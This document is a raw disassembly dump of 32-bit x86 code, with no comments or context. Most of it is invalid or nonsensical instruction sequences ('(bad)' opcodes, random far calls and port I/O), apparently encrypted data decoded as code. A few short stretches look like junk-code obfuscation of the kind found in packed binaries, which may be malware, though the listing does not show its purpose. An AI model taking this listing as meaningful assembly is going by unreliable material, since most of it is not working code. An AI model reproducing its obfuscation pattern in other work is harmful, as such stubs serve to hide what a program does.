  417e2c:	out    0x35,al
  417e2e:	imul   ecx,DWORD PTR [edi+ecx*8-0x58c0cbd5],0xbc79a025
  417e39:	pop    eax
  417e3a:	pop    DWORD PTR [edi+0x0]
  417e3d:	jo     0x417ea1
  417e3f:	test   DWORD PTR ds:0xa5a97e06,0x4860b688
  417e49:	push   eax
  417e4a:	loop   0x417e3f
  417e4c:	mov    al,ds:0x35133349
  417e51:	or     ebp,edi
  417e53:	xchg   DWORD PTR [ebx],ebx
  417e55:	popf   
  417e56:	ins    DWORD PTR es:[edi],dx
  417e57:	test   BYTE PTR [esi-0x4],dl
  417e5a:	jle    0x417ecd
  417e5c:	adc    BYTE PTR [edi*4-0x53b664f2],dl
  417e63:	and    eax,DWORD PTR [esi-0x40]
  417e66:	in     al,0xe6
  417e68:	sbb    eax,0xa234ebea
  417e6d:	scas   al,BYTE PTR es:[edi]
  417e6e:	pop    ss
  417e6f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417e71:	adc    al,0xea
  417e73:	sub    BYTE PTR [ecx-0x9],bl
  417e76:	shl    DWORD PTR [eax+0x65],0x9b
  417e7a:	mov    bl,0xb8
  417e7c:	jnp    0x417e2c
  417e7e:	mov    ds:0xf97abd6c,al
  417e83:	cmc    
  417e84:	sub    al,0xa4
  417e86:	repnz push esi
  417e88:	add    eax,DWORD PTR [ebx-0x7f]
  417e8b:	mov    ebp,0xbfe6ad3a
  417e90:	xor    DWORD PTR [edx],edx
  417e92:	in     eax,dx
  417e93:	add    al,0x10
  417e95:	inc    esi
  417e96:	aam    0x9e
  417e98:	cmp    eax,0xf650a00e
  417e9d:	mov    esi,DWORD PTR [edi+0x62]
  417ea0:	push   eax
  417ea1:	sahf   
  417ea2:	cld    
  417ea3:	scas   al,BYTE PTR es:[edi]
  417ea4:	cmp    eax,0x1ed004ac
  417ea9:	fs inc esp
  417eab:	repnz push 0x14
  417eae:	mov    bh,0x72
  417eb0:	dec    esp
  417eb1:	stos   DWORD PTR es:[edi],eax
  417eb2:	mov    DWORD PTR [esp+0x3c],0x63d5
  417eba:	mov    DWORD PTR ds:0x4283cf,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428293,0x4282eb
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x4283e3,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x4282df,0x1cb6
  417f20:	mov    DWORD PTR ds:0x4283db,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x4283e3,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428ee8
  417f43:	sub    DWORD PTR ds:0x4282b7,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42829b
  417f53:	mov    ecx,DWORD PTR ds:0x4282fb
  417f59:	and    DWORD PTR ds:0x4281f7,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x4283d3
  417f65:	mov    ecx,DWORD PTR ds:0x4281e7
  417f6b:	or     DWORD PTR ds:0x42837b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x4283ff
  417f77:	or     DWORD PTR ds:0x4282e7,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x20
  417f8f:	pop    edx
  417f90:	(bad)  
  417f91:	jl     0x417fe6
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1+0x565f1818],bh
  417f9c:	(bad)  
  417f9d:	loopne 0x417f1f
  417f9f:	mov    al,0x8e
  417fa1:	mov    ebx,0xa784009d
  417fa6:	pusha  
  417fa7:	not    ebp
  417fa9:	jae    0x417fb2
  417fab:	out    dx,eax
  417fac:	fnsave [ebp+0x2b9c94c9]
  417fb2:	outs   dx,DWORD PTR ds:[esi]
  417fb3:	jbe    0x417f5f
  417fb5:	call   0x42c21743
  417fba:	(bad)  
  417fbb:	imul   ecx,ecx,0xb28d1589
  417fc1:	xchg   ebx,eax
  417fc2:	pop    esi
  417fc3:	xchg   BYTE PTR [edi],ch
  417fc5:	(bad)  
  417fc6:	in     al,dx
  417fc7:	aas    
  417fc8:	add    cl,BYTE PTR [ebp+0x38]
  417fcb:	scas   al,BYTE PTR es:[edi]
  417fcc:	sub    BYTE PTR [ebx+0x32f3f57d],dl
  417fd2:	jnp    0x41801d
  417fd4:	outs   dx,BYTE PTR ds:[esi]
  417fd5:	mov    BYTE PTR [eax-0x6ab310a6],ch
  417fdb:	into   
  417fdc:	fdivr  QWORD PTR ds:0xbebeec84
  417fe2:	jno    0x417f69
  417fe4:	sub    esp,DWORD PTR [ecx-0x2f]
  417fe7:	and    DWORD PTR [ecx+0x6a],eax
  417fea:	push   ds
  417feb:	and    dl,BYTE PTR [edx-0x7]
  417fee:	cmp    DWORD PTR [edx+0x48],eax
  417ff1:	test   ah,bl
  417ff3:	je     0x418069
  417ff5:	ret    
  417ff6:	sub    al,0xd5
  417ff8:	mov    DWORD PTR [ebx-0x675953c9],eax
  417ffe:	iret   
  417fff:	jmp    0x41801d
  418001:	pop    esp
  418002:	pop    ebp
  418003:	adc    BYTE PTR [esi+ebp*2-0x7a2630f3],0x65
  41800b:	dec    ebp
  41800c:	xchg   edi,eax
  41800d:	repnz inc eax
  41800f:	sahf   
  418010:	dec    esi
  418011:	pop    eax
  418012:	mov    ?,WORD PTR [edi+esi*4+0x579c49d4]
  418019:	mov    dh,0xc3
  41801b:	add    al,0xca
  41801d:	fisttp WORD PTR [edx]
  41801f:	xchg   edx,eax
  418020:	out    dx,eax
  418021:	out    0x27,eax
  418023:	mov    fs,WORD PTR [ebx-0x58]
  418026:	jge    0x418079
  418028:	ins    DWORD PTR es:[edi],dx
  418029:	mov    edi,0x7f31dee5
  41802e:	push   cs
  41802f:	push   es
  418030:	mov    ah,0x6c
  418032:	lds    ebx,FWORD PTR [eax-0x5ca17fb2]
  418038:	add    eax,0xd6fef8ab
  41803d:	pop    ecx
  41803e:	add    BYTE PTR [ebx+ebx*1-0x78],0x50
  418043:	je     0x418018
  418045:	jmp    0x418036
  418047:	sbb    eax,0xc31b540a
  41804c:	xor    ebp,ebp
  41804e:	lock dec ebp
  418050:	loopne 0x417fe8
  418052:	std    
  418053:	jo     0x417fdb
  418055:	jbe    0x41809c
  418057:	cmp    dh,BYTE PTR [edi]
  418059:	xchg   ebp,eax
  41805a:	les    esp,FWORD PTR [ecx+0x3d]
  41805d:	les    esp,FWORD PTR gs:[ecx+0x54]
  418061:	into   
  418062:	jne    0x418038
  418064:	jl     0x41802a
  418066:	scas   eax,DWORD PTR es:[edi]
  418067:	adc    al,0x33
  418069:	scas   al,BYTE PTR es:[edi]
  41806a:	nop
  41806b:	call   0x79e4:0x31f7ba28
  418072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418073:	push   ebx
  418074:	js     0x4180e4
  418076:	xor    ah,BYTE PTR [edi]
  418078:	sub    esi,edi
  41807a:	pop    edi
  41807b:	sub    al,0xa4
  41807d:	(bad)  
  41807e:	xchg   ebp,eax
  41807f:	sti    
  418080:	mov    al,ds:0x5aa80b2c
  418085:	ss dec esi
  418087:	push   eax
  418088:	inc    ebx
  418089:	add    BYTE PTR [edi],0x2a
  41808c:	add    cl,bh
  41808e:	scas   eax,DWORD PTR es:[edi]
  41808f:	les    ebp,FWORD PTR [ebx-0x4b]
  418092:	inc    edx
  418093:	inc    eax
  418094:	rol    bh,cl
  418096:	imul   edi,DWORD PTR ds:0x911ade9e,0xfffffff0
  41809d:	xor    edx,0xffffffb4
  4180a0:	xor    eax,0x1f58ef23
  4180a5:	xchg   esp,eax
  4180a6:	pop    eax
  4180a7:	cmp    esp,DWORD PTR [ebx]
  4180a9:	ds stos BYTE PTR es:[edi],al
  4180ab:	jns    0x418076
  4180ad:	xlat   BYTE PTR ds:[ebx]
  4180ae:	and    DWORD PTR [ebp+edi*1+0x1a],eax
  4180b2:	jg     0x41812c
  4180b4:	adc    esi,ebp
  4180b6:	fcmove st,st(5)
  4180b8:	sbb    BYTE PTR [esi-0x72b30d3a],ah
  4180be:	fistp  DWORD PTR [ecx-0x11c94f]
  4180c4:	push   ecx
  4180c5:	sub    BYTE PTR [edx+0x62],bh
  4180c8:	inc    edi
  4180c9:	inc    ebx
  4180ca:	or     eax,0xfe27d637
  4180cf:	mov    ecx,0xa6f04eef
  4180d4:	stos   BYTE PTR es:[edi],al
  4180d5:	mov    al,0x6e
  4180d7:	mov    ch,0x86
  4180d9:	add    ebp,DWORD PTR [esi]
  4180db:	jne    0x41811a
  4180dd:	sub    al,0x6d
  4180df:	and    eax,0x59c0be0e
  4180e4:	inc    eax
  4180e5:	or     BYTE PTR [edi],bh
  4180e7:	push   0x38e3ed1
  4180ec:	pop    ss
  4180ed:	(bad)  
  4180ee:	popa   
  4180ef:	or     ecx,DWORD PTR [edx+0x2971bb5f]
  4180f5:	push   0x4bedb6c6
  4180fa:	adc    bl,BYTE PTR [ecx]
  4180fc:	int3   
  4180fd:	iret   
  4180fe:	push   ebp
  4180ff:	(bad)  
  418100:	push   esi
  418101:	imul   edi,DWORD PTR [edi+0x7f34fd60],0xffffffef
  418108:	test   BYTE PTR [edx+eiz*4-0x124b6c18],ch
  41810f:	cs adc ch,ah
  418112:	in     al,dx
  418113:	xor    bh,BYTE PTR [ebx]
  418115:	cdq    
  418116:	pushf  
  418117:	mov    dh,0x1b
  418119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41811a:	inc    eax
  41811b:	xchg   esi,eax
  41811c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41811d:	dec    edx
  41811e:	xchg   esp,eax
  41811f:	inc    esi
  418120:	inc    BYTE PTR [ebx+0x75]
  418123:	push   ebp
  418124:	call   0x49d9d5f7
  418129:	mov    ah,0xde
  41812b:	cwde   
  41812c:	in     eax,dx
  41812d:	xchg   edx,eax
  41812e:	xchg   edi,eax
  41812f:	(bad)  
  418131:	fist   WORD PTR [ebp-0x11]
  418134:	jae    0x4180c4
  418136:	sbb    DWORD PTR [ebp-0x5d173c08],0xad2a46c3
  418140:	jmp    DWORD PTR [ecx+0x34]
  418143:	and    BYTE PTR [eax+0xa],ch
  418146:	sub    bl,BYTE PTR [edi+eiz*2]
  418149:	xchg   ebx,eax
  41814a:	pop    esi
  41814b:	jbe    0x4180ea
  41814d:	icebp  
  41814e:	test   BYTE PTR [esi+0x4aa0dbf1],bl
  418154:	push   0xffffff99
  418156:	mov    al,0xb
  418158:	jl     0x4181c8
  41815a:	pop    edx
  41815b:	enter  0x6808,0x23
  41815f:	lods   eax,DWORD PTR ds:[esi]
  418160:	pop    ebx
  418161:	es and al,0x8a
  418164:	into   
  418165:	xlat   BYTE PTR ds:[ebx]
  418166:	or     al,0xae
  418168:	adc    bh,bh
  41816a:	push   DWORD PTR [ecx-0x3a]
  41816d:	je     0x4180ef
  41816f:	mov    ss,WORD PTR [edx-0x34]
  418172:	push   0x61
  418174:	jbe    0x41814a
  418176:	(bad)  
  418177:	and    BYTE PTR [edi+ebp*4],cl
  41817a:	(bad)  
  41817c:	inc    edx
  41817d:	cmp    edx,DWORD PTR [edi-0x1a]
  418180:	icebp  
  418181:	pop    edi
  418182:	loope  0x4181a9
  418184:	sbb    esi,DWORD PTR [ebp-0x5a46679b]
  41818a:	inc    ebx
  41818b:	sbb    eax,0xa75b0a5d
  418190:	fnsave [ebp-0x3f]
  418193:	jge    0x4181ec
  418195:	mov    cl,0x3b
  418197:	out    0xcb,al
  418199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41819a:	call   0xaca2:0xa3de6e27
  4181a1:	cdq    
  4181a2:	gs pop esp
  4181a4:	ins    BYTE PTR es:[edi],dx
  4181a5:	js     0x41814b
  4181a7:	lods   al,BYTE PTR ds:[esi]
  4181a8:	xlat   BYTE PTR ds:[ebx]
  4181a9:	mov    ?,WORD PTR [esi-0x3ab72273]
  4181af:	popa   
  4181b0:	pop    edx
  4181b1:	adc    DWORD PTR ds:0x42bed714,0x710ea97
  4181bb:	js     0x41816a
  4181bd:	stc    
  4181be:	dec    edi
  4181bf:	stos   BYTE PTR es:[edi],al
  4181c0:	dec    ebp
  4181c1:	sub    DWORD PTR [ebx+0x3f],0x77717084
  4181c8:	xchg   DWORD PTR [ecx+0x1f],eax
  4181cb:	cld    
  4181cc:	lock dec ecx
  4181ce:	adc    BYTE PTR [edi],ah
  4181d0:	mov    es,WORD PTR [edx+0x605d3f72]
  4181d6:	arpl   WORD PTR [ebp+0x1d761af2],dx
  4181dc:	ja     0x41816e
  4181de:	retf   0x3c69
  4181e1:	jbe    0x41821a
  4181e3:	inc    ecx
  4181e4:	add    eax,0x767bde70
  4181e9:	dec    ebp
  4181ea:	(bad)  
  4181eb:	ficom  WORD PTR [edi-0x5bc3d68f]
  4181f1:	les    ebp,FWORD PTR [edx+0x4ac79903]
  4181f7:	inc    ebp
  4181f8:	push   eax
  4181f9:	scas   eax,DWORD PTR es:[edi]
  4181fa:	add    eax,0x96212887
  4181ff:	cmp    ebp,DWORD PTR [esi]
  418201:	adc    DWORD PTR [ebp+0x47],0x3d7787f6
  418208:	out    0x6f,al
  41820a:	test   al,0xa0
  41820c:	push   ds
  41820d:	jne    0x4181f0
  41820f:	pop    ebx
  418210:	rcl    BYTE PTR [eax+ecx*1-0x5f],cl
  418214:	sbb    DWORD PTR [edx-0x3b],ecx
  418217:	dec    ebp
  418218:	test   eax,0x3f317bd0
  41821d:	mov    edx,0xb233c83c
  418222:	pop    ss
  418223:	test   eax,0xcaf043ee
  418228:	fnsave [ecx]
  41822a:	push   esi
  41822b:	lods   eax,DWORD PTR ds:[esi]
  41822c:	sub    edi,DWORD PTR [ebx+eiz*8-0x7]
  418230:	xchg   ecx,eax
  418231:	jp     0x418282
  418233:	loop   0x4181dd
  418235:	mov    edi,0xf937f36d
  41823a:	jnp    0x418253
  41823c:	sbb    eax,0x74282396
  418241:	aaa    
  418242:	dec    ebx
  418243:	(bad)  
  418244:	jnp    0x4181fa
  418246:	xor    al,0xd4
  418248:	mov    ecx,0xd4e024a
  41824d:	dec    ebx
  41824e:	cmc    
  41824f:	pop    ebx
  418250:	and    eax,0xdaed0b73
  418255:	push   ss
  418256:	nop
  418257:	xchg   ebp,eax
  418258:	adc    ebx,DWORD PTR [esi+0xa]
  41825b:	push   cs
  41825c:	pop    ds
  41825d:	jmp    0x4182d7
  41825f:	add    BYTE PTR [ebp+eax*4+0x6f],bh
  418263:	(bad)  
  418264:	or     eax,0xb6d5c1a2
  418269:	mov    bh,0xed
  41826b:	jbe    0x4182bb
  41826d:	imul   esi,DWORD PTR [ecx],0x63ef1ef6
  418273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418274:	xchg   ebx,eax
  418275:	and    DWORD PTR [ecx],ebx
  418277:	int3   
  418278:	sbb    ecx,esi
  41827a:	das    
  41827b:	add    BYTE PTR [edi+0xa],ch
  41827e:	sbb    eax,0x1ca27
  418283:	and    edi,esi
  418285:	jmp    0x3578:0x9f0b907d
  41828c:	adc    esp,DWORD PTR [ebx-0x34c12a04]
  418292:	std    
  418293:	xchg   edx,eax
  418294:	out    0x9a,al
  418296:	in     eax,dx
  418297:	scas   al,BYTE PTR es:[edi]
  418298:	cmp    BYTE PTR [ebp+ecx*1-0x42e30ac8],dh
  41829f:	je     0x4182b5
  4182a1:	adc    eax,DWORD PTR [edx]
  4182a3:	retf   0x842d
  4182a6:	dec    ebx
  4182a7:	les    ebx,FWORD PTR [ecx-0x18]
  4182aa:	adc    DWORD PTR [ebp+0x5119cdeb],eax
  4182b0:	cmp    eax,DWORD PTR [ebp+0x1f]
  4182b3:	push   cs
  4182b4:	xor    dl,0x9
  4182b7:	dec    ecx
  4182b8:	push   eax
  4182b9:	arpl   WORD PTR [edx],dx
  4182bb:	xchg   ecx,eax
  4182bc:	jle    0x418285
  4182be:	aam    0xae
  4182c0:	jbe    0x4182c6
  4182c2:	in     al,dx
  4182c3:	inc    ecx
  4182c4:	inc    ecx
  4182c5:	cmp    al,0xa6
  4182c7:	out    0xca,eax
  4182c9:	add    dl,al
  4182cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182cc:	dec    ebp
  4182cd:	mov    al,ds:0x21ebc8c7
  4182d2:	adc    DWORD PTR [eax],ecx
  4182d4:	nop
  4182d5:	xor    ch,bh
  4182d7:	ss pushf 
  4182d9:	mov    ecx,0x52ce5501
  4182de:	ret    0x1875
  4182e1:	xor    ecx,DWORD PTR [ebx+ecx*1-0x78]
  4182e5:	fwait
  4182e6:	js     0x418285
  4182e8:	mov    ds:0x8cb339fc,eax
  4182ed:	scas   al,BYTE PTR es:[edi]
  4182ee:	dec    esp
  4182ef:	jns    0x418367
  4182f1:	xor    DWORD PTR [ebp-0x3e83f6a],ebp
  4182f7:	rol    BYTE PTR [esi-0x35],cl
  4182fa:	jg     0x4182b1
  4182fc:	out    0x54,al
  4182fe:	ins    DWORD PTR es:[edi],dx
  4182ff:	ins    BYTE PTR es:[edi],dx
  418300:	fisub  WORD PTR [edi]
  418302:	aam    0xae
  418304:	mov    edx,DWORD PTR [edi+0x26a79d08]
  41830a:	add    bh,cl
  41830c:	out    0xfb,al
  41830e:	xchg   edx,eax
  41830f:	mov    ah,0x5a
  418311:	push   0xfffffff4
  418313:	arpl   di,ax
  418315:	fiadd  DWORD PTR gs:[ecx-0x4b2653c8]
  41831c:	outs   dx,BYTE PTR ds:[esi]
  41831d:	sbb    eax,0x8796d1ce
  418322:	bound  eax,QWORD PTR [esi+eiz*1+0x19f1a271]
  418329:	sub    eax,0x584cf5
  41832e:	call   0xef3bbe25
  418333:	scas   al,BYTE PTR es:[edi]
  418334:	int    0x9
  418336:	ds and dl,bl
  418339:	in     eax,dx
  41833a:	and    DWORD PTR [eax],ebx
  41833c:	fcomp  QWORD PTR [ebp-0x76d8fe42]
  418342:	mov    WORD PTR [ebx],ss
  418344:	jg     0x41833e
  418346:	outs   dx,BYTE PTR ds:[esi]
  418347:	outs   dx,BYTE PTR ds:[esi]
  418348:	adc    ebp,DWORD PTR [edx+0x2f]
  41834b:	icebp  
  41834c:	push   DWORD PTR [eax]
  41834e:	mov    eax,DWORD PTR [esp+0x34]
  418352:	cmp    DWORD PTR ds:0x4281e7,0x0
  418359:	mov    DWORD PTR ds:0x4282ab,0x42c6
  418363:	mov    DWORD PTR ds:0x4283e7,edx
  418369:	mov    DWORD PTR ds:0x4281c3,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x4282e7,0x243f
  418382:	mov    DWORD PTR ds:0x4282bf,0x6875
  41838c:	cmp    DWORD PTR ds:0x4281e7,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428383
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428eec
  4183ae:	add    DWORD PTR ds:0x42834f,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x4282d3
  4183ba:	xor    DWORD PTR ds:0x428387,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428363
  4183c6:	or     DWORD PTR ds:0x4281df,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42828b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42828f,0x4281fb
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x4281ef,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x4283ef
  418409:	or     DWORD PTR ds:0x4283e7,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x4281bf,0x428387
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42828b,0x0
  418430:	mov    DWORD PTR ds:0x42829b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x4283e3,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42828b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x4280e3
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428e48
  41846b:	sbb    DWORD PTR ds:0x4282cf,0x4c8f
  418475:	mov    DWORD PTR ds:0x4281c7,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x4283e3
  418485:	xor    ecx,DWORD PTR ds:0x42834b
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x4283e7,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x42835f,0x4282cb
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x428407,0x42828f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x42835b,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	and    al,0xf3
  4184f9:	push   ebp
  4184fa:	stos   BYTE PTR es:[edi],al
  4184fb:	not    cl
  4184fd:	push   ss
  4184fe:	sbb    BYTE PTR [edx+edx*1+0x76911818],bh
  418505:	add    DWORD PTR [edi],esp
  418507:	sti    
  418508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418509:	pop    esp
  41850a:	sbb    eax,0xe9055a65
  41850f:	cs inc esp
  418511:	fcomp  DWORD PTR [eax]
  418513:	jbe    0x4184ab
  418515:	(bad)  
  418516:	cmc    
  418517:	mov    al,ch
  418519:	outs   dx,BYTE PTR ds:[esi]
  41851a:	fcmovnbe st,st(1)
  41851c:	adc    ebx,DWORD PTR [esi]
  41851e:	nop
  41851f:	xor    eax,DWORD PTR [eax]
  418521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418522:	rcr    BYTE PTR [ebx+0x111ab6bc],cl
  418528:	mov    al,ds:0x5e2e9338
  41852d:	dec    ecx
  41852e:	adc    ah,al
  418530:	ret    
  418531:	and    BYTE PTR [edx+0x4],bl
  418534:	jmp    0x418587
  418536:	rcr    BYTE PTR [edx+0x6f655ab],0x8c
  41853d:	sbb    DWORD PTR [ecx],0xfffffff5
  418540:	aaa    
  418541:	xor    dh,BYTE PTR [edi]
  418543:	ror    DWORD PTR [ecx-0x4b6e1cb9],1
  418549:	pmaxsw mm0,QWORD PTR [ecx]
  41854c:	push   es
  41854d:	inc    ebp
  41854e:	fiadd  WORD PTR [eax]
  418550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418551:	jg     0x418595
  418553:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  418555:	adc    DWORD PTR [eax],edi
  418557:	(bad)  
  418558:	shl    DWORD PTR [ebx+0x5b],0xce
  41855c:	outs   dx,BYTE PTR ds:[esi]
  41855d:	test   BYTE PTR [edi],cl
  41855f:	lock sbb edx,DWORD PTR [edx]
  418562:	jecxz  0x41851b
  418564:	and    al,0x22
  418566:	mov    ebx,0xf43d9481
  41856b:	ret    0xae
  41856e:	push   ebp
  41856f:	mov    DWORD PTR ds:0x78819434,0xbffa6afd
  418579:	std    
  41857a:	sbb    al,0x42
  41857c:	outs   dx,DWORD PTR ds:[esi]
  41857d:	ins    DWORD PTR es:[edi],dx
  41857e:	jl     0x41851d
  418580:	add    al,0xf4
  418582:	sbb    eax,0x95f7dfee
  418587:	mov    ah,0x78
  418589:	pop    edi
  41858a:	sahf   
  41858b:	mov    WORD PTR [ebx+0x5c],fs
  41858e:	fld    DWORD PTR [edi]
  418590:	mov    ah,0xbb
  418592:	or     eax,0x556ea3a9
  418597:	push   ss
  418598:	xchg   edi,eax
  418599:	inc    ebx
  41859a:	cmp    DWORD PTR [ecx],eax
  41859c:	cmp    eax,0xe0e0a003
  4185a1:	dec    ecx
  4185a2:	fsub   DWORD PTR [ecx-0x2f]
  4185a5:	shl    BYTE PTR [edi+esi*8],1
  4185a8:	sbb    al,0x9c
  4185ab:	sub    DWORD PTR [ebp+0x43],esi
  4185ae:	outs   dx,DWORD PTR ds:[esi]
  4185af:	mov    esi,DWORD PTR [ebx]
  4185b1:	(bad)  
  4185b2:	and    al,BYTE PTR [ebp+0x65ceb841]
  4185b8:	push   ds
  4185b9:	in     al,0x8e
  4185bb:	mov    al,ds:0xe5ffb2e0
  4185c0:	xchg   edx,eax
  4185c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c2:	adc    ebp,DWORD PTR [ebx-0x35]
  4185c5:	jmp    0x279f63fd
  4185ca:	inc    edx
  4185cb:	inc    ebp
  4185cc:	or     esp,DWORD PTR [ecx-0x4]
  4185cf:	push   edi
  4185d0:	leave  
  4185d1:	bound  esp,QWORD PTR [edx]
  4185d3:	mov    bl,0xcc
  4185d5:	mov    BYTE PTR [edx+ebx*2],ah
  4185d8:	retf   
  4185d9:	push   edi
  4185da:	xchg   edi,eax
  4185db:	and    DWORD PTR [edx+0x27bf6048],esi
  4185e1:	cli    
  4185e2:	push   cs
  4185e3:	add    edi,DWORD PTR [ebx+0x183e0447]
  4185e9:	inc    ebx
  4185ea:	(bad)  
  4185eb:	xor    BYTE PTR [ecx+0x4c2a6d2f],0xec
  4185f2:	add    al,BYTE PTR [eax-0x5e]
  4185f5:	clc    
  4185f6:	push   ebp
  4185f7:	rcr    bl,0x96
  4185fa:	(bad)  
  4185fb:	push   eax
  4185fc:	push   edx
  4185fd:	mov    ah,0xbf
  4185ff:	jo     0x4185f5
  418601:	dec    ebp
  418602:	dec    edx
  418603:	mov    ?,WORD PTR [eax]
  418605:	and    BYTE PTR ds:0x163bcad1,ah
  41860b:	nop
  41860c:	nop
  41860d:	pop    esi
  41860e:	xchg   edi,eax
  41860f:	je     0x418591
  418611:	mov    edx,0x3722630c
  418616:	sbb    eax,0x26c3928
  41861b:	aaa    
  41861c:	lea    ecx,[edi+edx*1+0x18]
  418620:	hlt    
  418621:	rcl    eax,cl
  418623:	fwait
  418624:	dec    ebx
  418625:	dec    ecx
  418626:	xor    ecx,ebp
  418628:	push   0xffffffc4
  41862a:	retf   
  41862b:	std    
  41862c:	mov    bh,0x1e
  41862e:	test   al,0x44
  418630:	pushf  
  418631:	lods   eax,DWORD PTR ds:[esi]
  418632:	jbe    0x418623
  418634:	xor    DWORD PTR [esi+ebx*4-0x1b],esi
  418638:	je     0x4185f7
  41863a:	xchg   ebp,eax
  41863b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41863c:	fwait
  41863d:	xchg   edx,eax
  41863e:	or     al,0x9a
  418640:	adc    eax,0x2f63da49
  418645:	push   edi
  418646:	xrelease xchg DWORD PTR [edi],ecx
  418649:	out    0x9d,eax
  41864b:	(bad)  
  41864c:	call   0x4870:0x9e525df2
  418653:	outs   dx,DWORD PTR ds:[esi]
  418654:	out    0x8b,al
  418656:	inc    ecx
  418657:	lods   al,BYTE PTR ds:[esi]
  418658:	sbb    eax,0x4239beca
  41865d:	mov    ch,0xa7
  41865f:	dec    BYTE PTR [eax+ebx*1+0x6731b683]
  418666:	ror    edi,1
  418668:	mov    al,0x15
  41866a:	jecxz  0x418676
  41866c:	je     0x418651
  41866e:	xacquire xchg BYTE PTR [edx],ch
  418671:	inc    edx
  418672:	outs   dx,DWORD PTR ds:[esi]
  418673:	lods   al,BYTE PTR ds:[esi]
  418674:	addr16 in al,dx
  418676:	lds    edx,FWORD PTR [esi-0x59]
  418679:	sub    al,0x13
  41867b:	ss fwait
  41867d:	pusha  
  41867e:	ss push esp
  418680:	in     al,0xf3
  418682:	dec    edx
  418683:	repz jne 0x418661
  418686:	xchg   edx,eax
  418687:	test   DWORD PTR [eax],esp
  418689:	mov    ah,0x18
  41868b:	loopne 0x4186a1
  41868d:	sub    eax,0x401c9865
  418692:	push   eax
  418693:	cli    
  418694:	pop    eax
  418695:	leave  
  418696:	push   0x70
  418698:	(bad)  
  41869a:	rcl    DWORD PTR ds:0xc0e4ab15,0x84
  4186a1:	loope  0x41864e
  4186a3:	sbb    ebp,eax
  4186a5:	jno    0x418662
  4186a7:	bound  edx,QWORD PTR [ebx+ebx*4+0x117eecbc]
  4186ae:	(bad)  
  4186af:	jp     0x4186fb
  4186b1:	lods   eax,DWORD PTR ds:[esi]
  4186b2:	(bad)  
